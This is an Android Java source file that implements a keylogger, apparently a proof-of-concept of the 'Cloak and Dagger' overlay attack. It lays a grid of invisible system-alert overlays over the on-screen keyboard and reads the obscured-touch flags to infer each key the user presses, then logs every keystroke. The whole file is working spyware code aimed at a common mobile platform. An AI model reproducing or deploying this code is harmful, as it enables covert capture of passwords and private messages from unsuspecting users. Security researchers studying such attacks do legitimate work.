package andrews.cloakanddagger;

import android.content.Context;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

/**
 * Created by Andrew Schaffer on 11/1/2017.
 */

public class KeyloggerManager {

    private int MAX_INDEX = 65;                                         /** The maximum int the total of obscured flags should be **/
    private int type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
    private int flags = 0;
    private int width;
    private boolean shifted = false;
    private boolean alt = false;
    private String[] qwerty_alpha = {
            "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
            "a", "s", "d", "f", "g", "h", "j", "k", "l",
            "shift", "z", "x", "c", "v", "b", "n", "m", "back",
            "alt", "misc", " ", ".", "enter"};
    private String[] alt_alpha = {
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
            "@", "#", "$", "%", "&", "-", "+", "(", ")",
            "symbols", "*", "\"", "\'", ":", ";", "!", "?", "back",
            "alt", ",", " ", ".", "enter"};
    private WindowManager manager;
    private volatile Context parent;
    volatile View touch_view;
    volatile View[] row_1 = new View[10];
    volatile View[] row_2 = new View[9];
    volatile View[] row_3 = new View[9];
    volatile View[] row_4 = new View[5];
    volatile View[] row_1_cover = new View[10];
    volatile View[] row_2_cover = new View[9];
    volatile View[] row_3_cover = new View[9];
    volatile View[] row_4_cover = new View[5];
    volatile int total = 0;

    /** Initialize the necessary variables **/
    public KeyloggerManager(Context cxt, WindowManager manager, int width) {
        parent = cxt;
        this.manager = manager;
        this.width = width;

        makeOverlay();
    }

    /** Adds the overlay views in the qwerty keyboard order.
     *  The touched keys can be discovered by adding the total is_obscured_flags using MotionEvent.getFlags().
     *  The total is then used to reference the qwerty_keyboard array.
     */
    private void makeOverlay() {

        int i;
        manager = (WindowManager) parent.getSystemService(Context.WINDOW_SERVICE);

        /**Set up the touch listening view which won't be visible**/
        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch = new WindowManager.LayoutParams(0, 0, WindowManager.LayoutParams.TYPE_TOAST, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {

                if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    /**Wait for the total to be calculated **/
                    try {
                        Thread.sleep(10);
                    } catch (Exception e) {
                        System.err.println("Sleep error: " + e);
                        return false;
                    }

                    /** Print the key to system.out then reset total **/
                    if (MAX_INDEX-total >= 0) {
                        String key = qwerty_alpha[MAX_INDEX - total];
                        if (alt) {                                                                      /** If alt key was pressed then the alt_alpha will be used**/
                            key = alt_alpha[MAX_INDEX - total];
                            System.out.println("Total: " + total + " Input: " + key);
                            if (shifted) {
                                shifted = !shifted;
                            }
                            if (key.equals(" ") || key.equals("alt")) {
                                alt = !alt;
                            }
                        } else if (shifted) {                                                           /** If the shift key is pressed set shifted to not shifted **/
                            System.out.println("Total: " + total + " Input: " + key.toUpperCase());
                            shifted = !shifted;
                        } else if (key.equals("alt")) {                                                 /** Set alt keyboard flag **/
                            alt = !alt;
                        } else if (key.equals("shift")) {                                               /** Set shift keyboard flag **/
                            shifted = !shifted;
                        } else {                                                                        /** Print regular qwerty keyboard **/
                            System.out.println("Total: " + total + " Input: " + key);
                        }
                    }

                    total = 0;
                    return true;
                }

                return false;
            }
        });
        layoutParams_touch.gravity = Gravity.TOP | Gravity.RIGHT;
        manager.addView(touch_view, layoutParams_touch);

        /**Set up the grid of overlays for the keyboard
         * FLAG_WATCH_OUTSIDE_TOUCH is necessary to get the motionEvents.
         * A second layer of overlays is added to obscure the lower views that
         * are listening.**/
        for (i=0; i<row_1.length; i++) {

            row_1[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/10, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            row_1[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();

                    }
                    return false;
                }
            });

            row_1_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
            layoutParams_keys.x = (width/10)*i;
            layoutParams_keys.y = 525;

            manager.addView(row_1[i], layoutParams_keys);
            manager.addView(row_1_cover[i], layoutParams_keys);
        }
        for (i=0; i<row_2.length; i++) {

            row_2[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/9, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            row_2[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            row_2_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 350;

            manager.addView(row_2[i], layoutParams_keys);
            manager.addView(row_2_cover[i], layoutParams_keys);
        }
        for (i=0; i<row_3.length; i++) {

            row_3[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/9, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            row_3[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            row_3_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 175;

            manager.addView(row_3[i], layoutParams_keys);
            manager.addView(row_3_cover[i], layoutParams_keys);
        }

        for (i=0; i<row_4.length; i++) {

            row_4[i] = View.inflate(parent, R.layout.key_overlay, null);
            int test = (i == 2) ? ((width/9)*5) : (width/9);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(test, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            row_4[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            row_4_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
            layoutParams_keys.x = (i > 2) ? (width/9) * (i+4) : (width/9)*i;
            layoutParams_keys.y = 0;

            manager.addView(row_4[i], layoutParams_keys);
            manager.addView(row_4_cover[i], layoutParams_keys);
        }
    }
}
